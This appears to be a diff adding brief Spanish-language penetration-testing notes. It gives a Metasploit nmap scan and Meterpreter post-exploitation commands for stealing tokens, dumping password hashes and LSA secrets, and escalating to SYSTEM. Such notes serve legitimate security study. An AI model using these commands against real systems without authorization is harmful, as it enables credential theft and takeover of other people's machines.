@@ -1,0 +1,35 @@
+
+scan con nmap desde metasploit:
+db_nmap -sV -p- -T5 -A Target
+
+luego podemos desglosar la info con los comandos:
+hosts: muestra los hosts.
+services: muestra los servicios encontrados.
+
+
+
+Meterpreter commandos utiles:
+
+Help (muestra todos los comandos)
+
+información del sistema:
+sysinfo
+
+current user:
+getuid
+
+Robar el token de usuario de un servicio para escalar privilegios
+steal_token PID
+
+listar los hashes de los usuarios:
+hashdump
+
+listar info de los usuarios incluyendo los hash NTLM:
+lsa_dump_sam
+
+listar la secrets:
+lsa_dump_secrets
+
+Tomar un sistema (si se logra):
+getsystem
+
